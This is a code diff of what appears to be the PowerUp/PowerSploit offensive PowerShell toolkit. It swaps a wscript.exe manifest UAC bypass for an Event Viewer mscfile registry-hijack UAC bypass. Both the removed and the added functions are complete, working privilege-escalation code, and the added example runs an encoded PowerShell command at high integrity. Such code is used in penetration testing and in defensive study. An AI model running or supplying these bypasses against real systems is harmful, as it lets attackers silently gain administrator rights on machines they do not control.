@@ -4568,238 +4568,90 @@ PowerUp.UserAddMSI
 }
 
 
-function Invoke-WScriptUACBypass {
+function Invoke-EventVwrBypass {
 <#
 .SYNOPSIS
 
-Performs the bypass UAC attack by abusing the lack of an embedded manifest in wscript.exe.
+Bypasses UAC by performing an image hijack on the .msc file extension
+Only tested on Windows 7 and Windows 10
 
-Author: Matt Nelson (@enigma0x3), Will Schroeder (@harmj0y), Vozzie  
+Author: Matt Nelson (@enigma0x3)  
 License: BSD 3-Clause  
-Required Dependencies: None  
-
-.DESCRIPTION
-
-Drops wscript.exe and a custom manifest into C:\Windows and then proceeds to execute
-VBScript using the wscript executable with the new manifest. The VBScript executed by
-C:\Windows\wscript.exe will run elevated.
+Required Dependencies: None
 
 .PARAMETER Command
 
-The shell command you want wscript.exe to run elevated.
-
-.PARAMETER WindowStyle
-
-Whether to display or hide the window for the executed '-Command X'.
-Accepted values are 'Hidden' and 'Normal'/'Visible. Default is 'Hidden'.
+ Specifies the command you want to run in a high-integrity context. For example, you can pass it powershell.exe followed by any encoded command "powershell -enc <encodedCommand>"
 
 .EXAMPLE
 
-Invoke-WScriptUACBypass -Command "powershell.exe -ep Bypass -WindowStyle Hidden -enc <base64>"
+Invoke-EventVwrBypass -Command "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc IgBJAHMAIABFAGwAZQB2AGEAdABlAGQAOgAgACQAKAAoAFsAUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAFAAcgBpAG4AYwBpAHAAYQBsAF0AWwBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMASQBkAGUAbgB0AGkAdAB5AF0AOgA6AEcAZQB0AEMAdQByAHIAZQBuAHQAKAApACkALgBJAHMASQBuAFIAbwBsAGUAKABbAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AVwBpAG4AZABvAHcAcwBCAHUAaQBsAHQASQBuAFIAbwBsAGUAXQAnAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAJwApACkAIAAtACAAJAAoAEcAZQB0AC0ARABhAHQAZQApACIAIAB8ACAATwB1AHQALQBGAGkAbABlACAAQwA6AFwAVQBBAEMAQgB5AHAAYQBzAHMAVABlAHMAdAAuAHQAeAB0ACAALQBBAHAAcABlAG4AZAA="
 
-Launches the specified PowerShell encoded command in high-integrity.
-
-.EXAMPLE
-
-Invoke-WScriptUACBypass -Command cmd.exe -WindowStyle 'Visible'
-
-Spawns a high integrity cmd.exe.
-
-.LINK
-
-http://seclist.us/uac-bypass-vulnerability-in-the-windows-script-host.html
-https://github.com/Vozzie/uacscript
-https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-WScriptBypassUAC.ps1
+This will write out "Is Elevated: True" to C:\UACBypassTest.
 #>
 
-    [CmdletBinding()]
-    Param(
-        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
-        [Alias('CMD')]
-        [String]
+    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')]
+    Param (
+        [Parameter(Mandatory = $True)]
         [ValidateNotNullOrEmpty()]
+        [String]
         $Command,
 
-        [String]
-        [ValidateSet('Hidden', 'Normal', 'Visible')]
-        $WindowStyle = 'Hidden'
+        [Switch]
+        $Force
     )
+    $ConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
+    $SecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop
 
-    function Local:Get-TempFileName {
-        # generate temporary file Name
-        $sTempFolder = $env:Temp
-        $sTempFolder = $sTempFolder + '\'
-        $sTempFileName = [System.IO.Path]::GetRandomFileName() + '.tmp'
-        $sTempFileName = $sTempFileName -Split '\.',([regex]::matches($sTempFileName, '\.').count) -join ''
-        $sTempFileNameFinal = $sTempFolder + $sTempFileName
-        return $sTempFileNameFinal
+    if($ConsentPrompt -Eq 2 -And $SecureDesktopPrompt -Eq 1){
+        "UAC is set to 'Always Notify'. This module does not bypass this setting."
+        exit
     }
-
-    function Local:Invoke-CopyFile {
-        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
-        Param(
-            [String]
-            $sSource,
-
-            [String]
-            $sTarget
-        )
-
-        # cab wscript, send to temp and then extract it from temp to $env:WINDIR
-        $sTempFile = Get-TempFileName
-        Start-Process -WindowStyle Hidden -FilePath "$($env:WINDIR)\System32\makecab.exe" -ArgumentList "$sSource $sTempFile"
-        $Null = wusa "$sTempFile" /extract:"$sTarget" /quiet
-
-        Start-Sleep -Seconds 2
-        Remove-Item -Path $sTempFile -Force
-    }
-
-    function Local:Invoke-WscriptTrigger {
-        $VBSfileName = [System.IO.Path]::GetRandomFileName() + '.vbs'
-        $ADSFile = $VBSFileName -split '\.',([regex]::matches($VBSFileName,"\.").count) -join ''
-
-        $VBSPayload = "Dim objShell:"
-        $VBSPayload += "Dim oFso:"
-        $VBSPayload += "Set oFso = CreateObject(""Scripting.FileSystemObject""):"
-        $VBSPayload += "Set objShell = WScript.CreateObject(""WScript.Shell""):"
-        $VBSPayload += "command = ""$Command"":"
-
-        if ($WindowStyle -eq 'Hidden') {
-            $VBSPayload += "objShell.Run command, 0:"
-        }
-        else {
-            $VBSPayload += "objShell.Run command, 1:"
+    else{
+        #Begin Execution
+        $mscCommandPath = "HKCU:\Software\Classes\mscfile\shell\open\command"
+        $Command = $pshome + '\' + $Command
+        #Add in the new registry entries to hijack the msc file
+        if ($Force -or ((Get-ItemProperty -Path $mscCommandPath -Name '(default)' -ErrorAction SilentlyContinue) -eq $null)){
+            New-Item $mscCommandPath -Force |
+                New-ItemProperty -Name '(Default)' -Value $Command -PropertyType string -Force | Out-Null
+        }else{
+            Write-Warning "Key already exists, consider using -Force"
+            exit
         }
 
-        # stupid command to kick off a background cmd process to delete the wscript and manifest
-        $DelCommand = "$($env:WINDIR)\System32\cmd.exe /c """"start /b """""""" cmd /c """"timeout /t 5 >nul&&del $($env:WINDIR)\wscript.exe&&del $($env:WINDIR)\wscript.exe.manifest"""""""""
-        $VBSPayload += "command = ""$DelCommand"":"
-        $VBSPayload += "objShell.Run command, 0:"
-        $VBSPayload += "Set objShell = Nothing"
-
-        Write-Verbose "[*] Storing VBS payload into `"$env:USERPROFILE\AppData:$ADSFile`""
-        $CreateWrapperADS = {cmd /C "echo $VBSPayload > ""$env:USERPROFILE\AppData:$ADSFile"""}
-        Invoke-Command -ScriptBlock $CreateWrapperADS
-
-        Write-Verbose "[*] Executing VBS payload with modified scripting host"
-        $ExecuteScript = {cmd /C "$($env:WINDIR)\wscript.exe ""$env:USERPROFILE\AppData:$ADSFile"""}
-        Invoke-Command -ScriptBlock $ExecuteScript
-
-        Write-Verbose "[*] Removing Alternate Data Stream from $("$env:USERPROFILE\AppData:$ADSFile")"
-        Remove-ADS $env:USERPROFILE\AppData:$ADSFile
-    }
-
-    function Local:Invoke-WscriptElevate {
-
-        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
-        Param()
-
-        $WscriptManifest =
-@"
-<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
-<assembly xmlns="urn:schemas-microsoft-com:asm.v1"
-          xmlns:asmv3="urn:schemas-microsoft-com:asm.v3"
-          manifestVersion="1.0">
-  <asmv3:trustInfo>
-    <security>
-      <requestedPrivileges>
-        <requestedExecutionLevel level="RequireAdministrator" uiAccess="false"/>
-      </requestedPrivileges>
-    </security>
-  </asmv3:trustInfo>
-  <asmv3:application>
-    <asmv3:windowsSettings xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">
-      <autoElevate>true</autoElevate>
-      <dpiAware>true</dpiAware>
-    </asmv3:windowsSettings>
-  </asmv3:application>
-</assembly>
-"@
-
-        # Copy and apply manifest to wscript.exe
-        $sManifest = $env:Temp + "\wscript.exe.manifest"
-        $WscriptManifest | Out-File $sManifest -Encoding UTF8
-
-        Write-Verbose "[*] Cabbing and extracting manifest into $($env:WINDIR)"
-        Invoke-CopyFile $sManifest $env:WINDIR
-
-        Write-Verbose "[*] Cabbing and extracting wscript.exe into $($env:WINDIR)"
-        $WScriptPath = "$($env:WINDIR)\System32\wscript.exe"
-        Invoke-CopyFile $WScriptPath $env:WINDIR
-        Remove-Item -Force $sManifest
-
-        Invoke-WscriptTrigger
-    }
-
-    function Local:Remove-ADS {
-    <#
-    .SYNOPSIS
-    Removes an alterate data stream from a specified location.
-    P/Invoke code adapted from PowerSploit's Mayhem.psm1 module.
-
-    Author: @harmj0y, @mattifestation
-    License: BSD 3-Clause
-
-    .LINK
-    https://github.com/mattifestation/PowerSploit/blob/master/Mayhem/Mayhem.psm1
-    #>
-
-        [CmdletBinding()]
-        Param(
-            [Parameter(Mandatory = $True)]
-            [String]
-            $ADSPath
-        )
-
-        #region define P/Invoke types dynamically
-        #   stolen from PowerSploit https://github.com/mattifestation/PowerSploit/blob/master/Mayhem/Mayhem.psm1
-        $DynAssembly = New-Object System.Reflection.AssemblyName('Win32')
-        $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
-        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32', $False)
-
-        $TypeBuilder = $ModuleBuilder.DefineType('Win32.Kernel32', 'Public, Class')
-        $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
-        $SetLastError = [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
-        $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor,
-            @('kernel32.dll'),
-            [Reflection.FieldInfo[]]@($SetLastError),
-            @($True))
-
-        # Define [Win32.Kernel32]::DeleteFile
-        $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('DeleteFile',
-            'kernel32.dll',
-            ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
-            [Reflection.CallingConventions]::Standard,
-            [Bool],
-            [Type[]]@([String]),
-            [Runtime.InteropServices.CallingConvention]::Winapi,
-            [Runtime.InteropServices.CharSet]::Ansi)
-        $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)
-
-        $Kernel32 = $TypeBuilder.CreateType()
-
-        $Result = $Kernel32::DeleteFile($ADSPath)
-
-        if ($Result) {
-            Write-Verbose "Alternate Data Stream at $ADSPath successfully removed."
+        if (Test-Path $mscCommandPath) {
+            Write-Verbose "Created registry entries to hijack the msc extension"
+        }else{
+            Write-Warning "Failed to create registry key, exiting"
+            exit
         }
-        else {
-            Write-Verbose "Alternate Data Stream at $ADSPath removal failure!"
-        }
-    }
 
-    # make sure we are running on vulnerable windows version (vista,7)
-    $OSVersion = [Environment]::OSVersion.Version
-    if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2))) {
-        if (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator') -eq $True){
-            Write-Warning '[!] You are already elevated!'
+        $EventvwrPath = Join-Path -Path ([Environment]::GetFolderPath('System')) -ChildPath 'eventvwr.exe'
+        #Start Event Viewer
+        if ($PSCmdlet.ShouldProcess($EventvwrPath, 'Start process')) {
+            $Process = Start-Process -FilePath $EventvwrPath -PassThru
+            Write-Verbose "Started eventvwr.exe"
         }
-        else {
-            Invoke-WscriptElevate
+
+        #Sleep 5 seconds 
+        Write-Verbose "Sleeping 5 seconds to trigger payload"
+        if (-not $PSBoundParameters['WhatIf']) {
+            Start-Sleep -Seconds 5
         }
-    }
-    else {
-        Write-Warning '[!] Target machine is not vulnerable.'
+
+        $mscfilePath = "HKCU:\Software\Classes\mscfile"
+
+        if (Test-Path $mscfilePath) {
+            #Remove the registry entry
+            Remove-Item $mscfilePath -Recurse -Force
+            Write-Verbose "Removed registry entries"
+        }
+
+        if(Get-Process -Id $Process.Id -ErrorAction SilentlyContinue){
+            Stop-Process -Id $Process.Id
+            Write-Verbose "Killed running eventvwr process"
+        }
     }
 }
 
